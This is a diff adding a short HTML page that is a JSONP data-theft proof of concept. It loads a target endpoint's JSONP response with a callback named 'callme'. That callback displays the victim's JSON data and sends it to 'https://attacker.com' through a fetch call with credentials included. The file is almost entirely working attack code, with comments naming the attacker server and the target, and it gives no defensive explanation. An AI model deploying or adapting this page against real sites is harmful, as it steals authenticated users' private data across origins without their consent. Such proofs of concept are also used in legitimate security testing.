@@ -1,0 +1,27 @@
+<html>
+<head>
+</head>
+<body>
+
+<p id="demo"></p>
+
+<script>
+function callme(resp) {
+
+// alerts the json response
+alert(JSON.stringify(resp));
+  
+// replaces the id demo with json response  
+document.getElementById("demo").innerHTML = JSON.stringify(resp);
+
+// logs the json response in the attacker server
+fetch('https://attacker.com/?info='+JSON.stringify(resp), {method: 'GET', credentials: 'include', headers: {'Content-Type': 'application/json'}});
+
+}
+</script>
+
+<!-- target endpoint json response with jsonp -->
+<script src="https://target.com/info?callback=callme"></script>
+
+</body>
+</html>
